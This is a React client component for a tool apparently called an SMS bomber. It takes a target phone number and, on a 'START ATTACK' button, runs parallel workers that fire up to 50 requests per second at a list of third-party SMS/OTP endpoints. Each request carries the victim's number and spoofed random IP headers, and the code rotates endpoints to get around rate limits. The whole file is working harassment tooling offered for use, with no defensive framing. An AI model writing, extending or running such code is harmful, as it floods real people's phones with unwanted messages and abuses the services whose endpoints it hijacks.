'use client';

import { useState, useRef, useEffect } from 'react';
import { Play, Square, Trash2, Activity, CheckCircle2, XCircle, Clock, Zap } from 'lucide-react';
import { motion } from 'motion/react';
import { BOMBER_APIS } from '@/lib/apis';

interface TestResult {
  id: string;
  timestamp: Date;
  success: boolean;
  statusCode: number;
  responseTime: number;
  endpoint: string;
  data?: any;
  error?: string;
}

interface Stats {
  total: number;
  success: number;
  failed: number;
  responseTimes: number[];
}

const generateRandomIP = () => {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
};

export default function Tester() {
  const [phoneNumber, setPhoneNumber] = useState<string>('');
  const [phoneError, setPhoneError] = useState('');
  const [targetRps, setTargetRps] = useState<number>(10); // Target Requests Per Second
  const [backoffStrategy, setBackoffStrategy] = useState<'fixed' | 'linear' | 'exponential'>('exponential');
  const [isRunning, setIsRunning] = useState(false);
  const [results, setResults] = useState<TestResult[]>([]);
  const [stats, setStats] = useState<Stats>({ total: 0, success: 0, failed: 0, responseTimes: [] });
  const [showClearConfirm, setShowClearConfirm] = useState(false);

  const runningRef = useRef(false);
  const cooldownsRef = useRef<Record<string, number>>({});
  const apiHealthRef = useRef<Record<string, { successes: number, failures: number }>>({});
  const resultsEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (resultsEndRef.current) {
      resultsEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [results]);

  const handleStart = async () => {
    if (!phoneNumber) {
      setPhoneError('Phone number is required');
      return;
    }
    if (!/^\d{10}$/.test(phoneNumber)) {
      setPhoneError('Please enter a valid 10-digit phone number');
      return;
    }
    setPhoneError('');
    
    setIsRunning(true);
    runningRef.current = true;
    cooldownsRef.current = {}; // Reset cooldowns on start
    // We intentionally do NOT reset apiHealthRef here so it learns across sessions
    
    // Calculate workers to distribute the RPS load
    // Cap the maximum workers to prevent browser/network crash (e.g., max 15)
    const numWorkers = Math.max(1, Math.min(15, Math.ceil(targetRps / 3)));
    
    const workers = Array.from({ length: numWorkers }).map(() => runWorker(numWorkers));
    await Promise.all(workers);
  };

  const handleStop = () => {
    setIsRunning(false);
    runningRef.current = false;
  };

  const handleClear = () => {
    setShowClearConfirm(true);
  };

  const confirmClearLogs = () => {
    setResults([]);
    setStats({ total: 0, success: 0, failed: 0, responseTimes: [] });
    setShowClearConfirm(false);
  };

  const runWorker = async (numWorkers: number) => {
    while (runningRef.current) {
      await runSingleTest();
      // Calculate delay to achieve target RPS across all workers
      const delay = Math.max(50, Math.floor((1000 * numWorkers) / targetRps));
      await new Promise(resolve => setTimeout(resolve, delay)); 
    }
  };

  const runSingleTest = async () => {
    if (!runningRef.current) return;

    let success = false;
    let attempts = 0;
    let waitLoops = 0;
    const maxAttempts = 15; // Try up to 15 different APIs to ensure the message gets delivered
    const maxWaitLoops = 20; // Max 10 seconds waiting for cooldowns
    let lastData: any = null;
    let lastError: any = null;
    let lastEndpoint = '';

    while (attempts < maxAttempts && !success && runningRef.current) {
      // Filter APIs that are not in cooldown
      const now = Date.now();
      const availableApis = BOMBER_APIS.filter(api => {
        if (cooldownsRef.current[api.endpoint] > now) return false;
        
        // Filter out completely dead APIs (e.g., < 20% success rate after 4 tries)
        const health = apiHealthRef.current[api.endpoint];
        if (health && (health.successes + health.failures) >= 4) {
          const rate = health.successes / (health.successes + health.failures);
          if (rate < 0.2) return false;
        }
        return true;
      });
      
      // If all APIs are in cooldown, wait a bit and try again without consuming an attempt
      if (availableApis.length === 0) {
        waitLoops++;
        if (waitLoops > maxWaitLoops) break; // Give up if we wait too long
        await new Promise(resolve => setTimeout(resolve, 500));
        continue;
      }

      attempts++;

      // Sort available APIs by health to prefer better ones
      availableApis.sort((a, b) => {
         const healthA = apiHealthRef.current[a.endpoint];
         const healthB = apiHealthRef.current[b.endpoint];
         const rateA = healthA ? healthA.successes / (healthA.successes + healthA.failures) : 0.5;
         const rateB = healthB ? healthB.successes / (healthB.successes + healthB.failures) : 0.5;
         return rateB - rateA;
      });

      // Pick from the top 30% of available APIs to ensure variety but heavily favor good ones
      const topPoolSize = Math.max(1, Math.ceil(availableApis.length * 0.3));
      const apiTemplate = availableApis[Math.floor(Math.random() * topPoolSize)];
      lastEndpoint = apiTemplate.endpoint;
      const randomIp = generateRandomIP();

      // Deep clone to avoid modifying the template
      const apiToTest = JSON.parse(JSON.stringify(apiTemplate));

      // Replace placeholders in headers
      const processedHeaders: Record<string, string> = {};
      let contentType = '';
      for (const [key, value] of Object.entries(apiToTest.headers)) {
        if (typeof value === 'string') {
          processedHeaders[key] = value.replace(/\{ip\}/g, randomIp).replace(/\{phone\}/g, phoneNumber);
        } else {
          processedHeaders[key] = String(value);
        }
        if (key.toLowerCase() === 'content-type') {
          contentType = processedHeaders[key].toLowerCase();
        }
      }

      // Replace placeholders in payload
      let processedPayload: any = apiToTest.payload;
      if (typeof apiToTest.payload === 'object' && apiToTest.payload !== null) {
        if (contentType.includes('application/x-www-form-urlencoded')) {
          const params = new URLSearchParams();
          for (const [k, v] of Object.entries(apiToTest.payload)) {
            const val = typeof v === 'string' ? v.replace(/\{phone\}/g, phoneNumber) : String(v);
            params.append(k, val);
          }
          processedPayload = params.toString();
        } else if (contentType.includes('application/json')) {
          let payloadStr = JSON.stringify(apiToTest.payload);
          payloadStr = payloadStr.replace(/\{phone\}/g, phoneNumber);
          processedPayload = payloadStr;
        } else {
          let payloadStr = JSON.stringify(apiToTest.payload);
          payloadStr = payloadStr.replace(/\{phone\}/g, phoneNumber);
          try {
            processedPayload = JSON.parse(payloadStr);
          } catch (e) {
            processedPayload = payloadStr;
          }
        }
      } else if (typeof apiToTest.payload === 'string') {
        processedPayload = apiToTest.payload.replace(/\{phone\}/g, phoneNumber);
      }

      try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 12000); // 12s client timeout

        const res = await fetch('/api/test', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            endpoint: apiToTest.endpoint,
            method: apiToTest.method,
            headers: processedHeaders,
            payload: processedPayload
          }),
          signal: controller.signal
        });
        clearTimeout(timeoutId);

        const data = await res.json();
        lastData = data;

        // Consider 2xx and 3xx as success for testing purposes
        if (data.success || (data.status_code >= 200 && data.status_code < 400)) {
          success = true;
          if (!apiHealthRef.current[apiToTest.endpoint]) apiHealthRef.current[apiToTest.endpoint] = { successes: 0, failures: 0 };
          apiHealthRef.current[apiToTest.endpoint].successes++;
        } else {
          if (!apiHealthRef.current[apiToTest.endpoint]) apiHealthRef.current[apiToTest.endpoint] = { successes: 0, failures: 0 };
          apiHealthRef.current[apiToTest.endpoint].failures++;

          // If rate limited (429) or server error (5xx), apply backoff strategy
          if (data.status_code === 429 || data.status_code >= 500) {
            let backoffTime = 1000;
            if (backoffStrategy === 'linear') backoffTime = 1000 * attempts;
            if (backoffStrategy === 'exponential') backoffTime = 1000 * Math.pow(2, attempts - 1);
            
            // Heavier penalty for 429 and 5xx
            if (data.status_code === 429) backoffTime = Math.max(backoffTime, 15000); // Min 15s cooldown
            if (data.status_code >= 500) backoffTime = Math.max(backoffTime, 10000); // Min 10s cooldown
            
            // Put API in cooldown so other workers don't hit it
            cooldownsRef.current[apiToTest.endpoint] = Date.now() + backoffTime;
            
            // Short delay before trying NEXT API
            await new Promise(resolve => setTimeout(resolve, 300));
          } else {
            // For 400s, it might be a payload issue. Put in long cooldown to avoid hammering.
            cooldownsRef.current[apiToTest.endpoint] = Date.now() + 30000;
            await new Promise(resolve => setTimeout(resolve, 300));
          }
        }
      } catch (error: any) {
        lastError = error;
        if (!apiHealthRef.current[apiToTest.endpoint]) apiHealthRef.current[apiToTest.endpoint] = { successes: 0, failures: 0 };
        apiHealthRef.current[apiToTest.endpoint].failures++;
        
        // Apply backoff on network errors too
        let backoffTime = 1000;
        if (backoffStrategy === 'linear') backoffTime = 1000 * attempts;
        if (backoffStrategy === 'exponential') backoffTime = 1000 * Math.pow(2, attempts - 1);
        
        // Min 8s cooldown for network/timeout errors
        backoffTime = Math.max(backoffTime, 8000);
        
        cooldownsRef.current[apiToTest.endpoint] = Date.now() + backoffTime;
        await new Promise(resolve => setTimeout(resolve, 300));
      }
    }

    if (!runningRef.current) return;

    if (success && lastData) {
      const newResult: TestResult = {
        id: Math.random().toString(36).substring(7),
        timestamp: new Date(),
        success: true,
        statusCode: lastData.status_code,
        responseTime: lastData.response_time,
        endpoint: lastData.endpoint,
        data: lastData.data,
        error: lastData.error
      };

      setResults(prev => [...prev, newResult].slice(-150)); // Keep last 150
      
      setStats(prev => {
        const newTimes = [...prev.responseTimes, lastData.response_time].slice(-150);
        return {
          total: prev.total + 1,
          success: prev.success + 1,
          failed: prev.failed,
          responseTimes: newTimes
        };
      });
    } else {
      let errorMessage = lastError?.message || lastData?.error;
      if (!errorMessage && lastData?.data) {
        try {
          errorMessage = typeof lastData.data === 'string' ? lastData.data : JSON.stringify(lastData.data);
        } catch (e) {
          errorMessage = 'Unknown error data';
        }
      }
      if (!errorMessage) {
        errorMessage = `HTTP ${lastData?.status_code || 500}`;
      }

      const newResult: TestResult = {
        id: Math.random().toString(36).substring(7),
        timestamp: new Date(),
        success: false,
        statusCode: lastData?.status_code || 500,
        responseTime: lastData?.response_time || 0,
        endpoint: lastEndpoint || '',
        error: errorMessage
      };
      
      setResults(prev => [...prev, newResult].slice(-150));
      setStats(prev => ({
        ...prev,
        total: prev.total + 1,
        failed: prev.failed + 1,
        responseTimes: prev.responseTimes
      }));
    }
  };

  const avgResponseTime = stats.responseTimes.length > 0 
    ? Math.round(stats.responseTimes.reduce((a, b) => a + b, 0) / stats.responseTimes.length) 
    : 0;

  return (
    <div className="space-y-8">
      {/* Stats Section */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
        <StatCard title="Total Requests" value={stats.total} icon={<Activity className="w-5 h-5 text-orange-400" />} />
        <StatCard title="Successful" value={stats.success} icon={<CheckCircle2 className="w-5 h-5 text-emerald-400" />} />
        <StatCard title="Failed" value={stats.failed} icon={<XCircle className="w-5 h-5 text-red-400" />} />
        <StatCard title="Avg Response" value={`${avgResponseTime}ms`} icon={<Clock className="w-5 h-5 text-yellow-400" />} />
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
        {/* Control Panel */}
        <div className="lg:col-span-1 bg-slate-900/50 backdrop-blur-xl border border-slate-800 rounded-2xl p-6 shadow-2xl h-fit sticky top-24">
          <h2 className="text-xl font-semibold mb-6 flex items-center gap-2">
            <Zap className="w-5 h-5 text-red-400" />
            Turbo Controls
          </h2>
          
          <div className="space-y-6">
            <div>
              <label className="block text-sm font-medium text-slate-300 mb-2">Target Phone Number</label>
              <input 
                type="text" 
                placeholder="Enter 10-digit number"
                className={`w-full bg-slate-950 border ${phoneError ? 'border-red-500 focus:ring-red-500' : 'border-slate-800 focus:ring-red-500'} rounded-xl px-4 py-3 text-lg font-mono tracking-wider focus:ring-2 outline-none transition-all`}
                value={phoneNumber}
                onChange={(e) => {
                  setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10));
                  if (phoneError) setPhoneError('');
                }}
                disabled={isRunning}
              />
              {phoneError && (
                <p className="text-xs text-red-400 mt-2">{phoneError}</p>
              )}
            </div>

            <div>
              <div className="flex justify-between items-center mb-2">
                <label className="block text-sm font-medium text-slate-300">Target Requests/Sec (RPS)</label>
                <span className="text-xs font-mono bg-red-500/20 text-red-300 px-2 py-1 rounded-md">{targetRps} RPS</span>
              </div>
              <input 
                type="range" 
                min="1" 
                max="50" 
                value={targetRps}
                onChange={(e) => setTargetRps(parseInt(e.target.value))}
                disabled={isRunning}
                className="w-full h-2 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-red-500"
              />
              <div className="flex justify-between text-xs text-slate-500 mt-2">
                <span>1 RPS (Safe)</span>
                <span>50 RPS (Aggressive)</span>
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium text-slate-300 mb-2">Backoff Strategy</label>
              <select
                value={backoffStrategy}
                onChange={(e) => setBackoffStrategy(e.target.value as any)}
                disabled={isRunning}
                className="w-full bg-slate-950 border border-slate-800 focus:ring-red-500 rounded-xl px-4 py-3 text-sm text-slate-300 focus:ring-2 outline-none transition-all appearance-none"
                style={{ backgroundImage: 'url("data:image/svg+xml,%3csvg xmlns=\'http://www.w3.org/2000/svg\' fill=\'none\' viewBox=\'0 0 20 20\'%3e%3cpath stroke=\'%236b7280\' stroke-linecap=\'round\' stroke-linejoin=\'round\' stroke-width=\'1.5\' d=\'M6 8l4 4 4-4\'/%3e%3c/svg%3e")', backgroundPosition: 'right 0.5rem center', backgroundRepeat: 'no-repeat', backgroundSize: '1.5em 1.5em' }}
              >
                <option value="fixed">Fixed (1s delay)</option>
                <option value="linear">Linear (1s, 2s, 3s...)</option>
                <option value="exponential">Exponential (1s, 2s, 4s...)</option>
              </select>
            </div>

            <div className="pt-4 grid grid-cols-2 gap-3">
              {!isRunning ? (
                <button 
                  onClick={handleStart}
                  className="col-span-2 py-4 bg-red-600 hover:bg-red-500 text-white rounded-xl font-bold text-lg transition-all flex items-center justify-center gap-2 shadow-lg shadow-red-900/20"
                >
                  <Play className="w-6 h-6 fill-current" /> START ATTACK
                </button>
              ) : (
                <button 
                  onClick={handleStop}
                  className="col-span-2 py-4 bg-red-600 hover:bg-red-500 text-white rounded-xl font-bold text-lg transition-all flex items-center justify-center gap-2 shadow-lg shadow-red-900/20 animate-pulse"
                >
                  <Square className="w-6 h-6 fill-current" /> STOP ATTACK
                </button>
              )}
              
              <button 
                onClick={handleClear}
                disabled={isRunning || results.length === 0}
                className="col-span-2 py-3 bg-slate-800 hover:bg-slate-700 disabled:opacity-50 disabled:cursor-not-allowed text-slate-300 rounded-xl font-medium transition-all flex items-center justify-center gap-2"
              >
                <Trash2 className="w-4 h-4" /> Clear Logs
              </button>
            </div>
          </div>
        </div>

        {/* Results Panel */}
        <div className="lg:col-span-2 bg-slate-900/50 backdrop-blur-xl border border-slate-800 rounded-2xl p-6 shadow-2xl flex flex-col h-[600px]">
          <div className="flex items-center justify-between mb-6">
            <h2 className="text-xl font-semibold flex items-center gap-2">
              <Activity className={`w-5 h-5 text-red-400 ${isRunning ? 'animate-pulse' : ''}`} />
              Live Request Logs
            </h2>
            <div className="flex items-center gap-3">
              {isRunning && (
                <span className="flex items-center gap-2 text-xs font-medium text-emerald-400 bg-emerald-400/10 px-3 py-1 rounded-full">
                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
                  Running at {targetRps} RPS
                </span>
              )}
              <span className="text-sm text-slate-500 font-mono">{results.length} records</span>
            </div>
          </div>
          
          <div className="flex-1 overflow-y-auto pr-2 space-y-2 custom-scrollbar">
            {results.length === 0 ? (
              <div className="h-full flex flex-col items-center justify-center text-slate-500 space-y-4">
                <Zap className="w-12 h-12 opacity-20" />
                <p>Enter a number and click Start Attack to begin.</p>
              </div>
            ) : (
              results.map((result) => (
                <motion.div 
                  initial={{ opacity: 0, x: -10 }}
                  animate={{ opacity: 1, x: 0 }}
                  key={result.id} 
                  className={`p-3 rounded-lg border flex items-center justify-between ${result.success ? 'bg-emerald-950/10 border-emerald-900/30' : 'bg-red-950/10 border-red-900/30'}`}
                >
                  <div className="flex items-center gap-3 overflow-hidden">
                    {result.success ? (
                      <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
                    ) : (
                      <XCircle className="w-4 h-4 text-red-500 shrink-0" />
                    )}
                    <span className={`font-mono text-xs font-bold w-8 ${result.success ? 'text-emerald-400' : 'text-red-400'}`}>
                      {result.statusCode}
                    </span>
                    <div className="flex flex-col overflow-hidden">
                      <span className="text-xs text-slate-400 truncate max-w-[200px] md:max-w-[350px]">
                        {result.endpoint}
                      </span>
                      {!result.success && result.error && (
                        <span className="text-[10px] text-red-400/80 truncate max-w-[200px] md:max-w-[350px]">
                          {result.error}
                        </span>
                      )}
                    </div>
                  </div>
                  <div className="flex items-center gap-3 text-[10px] font-mono text-slate-500 shrink-0">
                    <span className="flex items-center gap-1">
                      <Clock className="w-3 h-3" /> {result.responseTime}ms
                    </span>
                    <span>{result.timestamp.toLocaleTimeString()}</span>
                  </div>
                </motion.div>
              ))
            )}
            <div ref={resultsEndRef} />
          </div>
        </div>
      </div>

      {/* Clear Confirmation Modal */}
      {showClearConfirm && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
          <motion.div 
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="bg-slate-900 border border-slate-800 rounded-2xl p-6 max-w-md w-full shadow-2xl"
          >
            <h3 className="text-xl font-semibold text-white mb-2">Clear Logs</h3>
            <p className="text-slate-400 mb-6">
              Are you sure you want to clear all test results and statistics?
            </p>
            <div className="flex justify-end gap-3">
              <button 
                onClick={() => setShowClearConfirm(false)}
                className="px-4 py-2 rounded-xl font-medium text-slate-300 hover:bg-slate-800 transition-colors"
              >
                Cancel
              </button>
              <button 
                onClick={confirmClearLogs}
                className="px-4 py-2 rounded-xl font-medium bg-red-600 hover:bg-red-500 text-white transition-colors shadow-lg shadow-red-900/20"
              >
                Confirm
              </button>
            </div>
          </motion.div>
        </div>
      )}
    </div>
  );
}

function StatCard({ title, value, icon }: { title: string, value: string | number, icon: React.ReactNode }) {
  return (
    <div className="bg-slate-900/50 backdrop-blur-xl border border-slate-800 rounded-2xl p-5 shadow-lg flex items-center gap-4 hover:bg-slate-800/50 transition-colors">
      <div className="p-3 bg-slate-950 rounded-xl border border-slate-800">
        {icon}
      </div>
      <div>
        <p className="text-sm font-medium text-slate-400">{title}</p>
        <p className="text-2xl font-bold text-slate-100">{value}</p>
      </div>
    </div>
  );
}

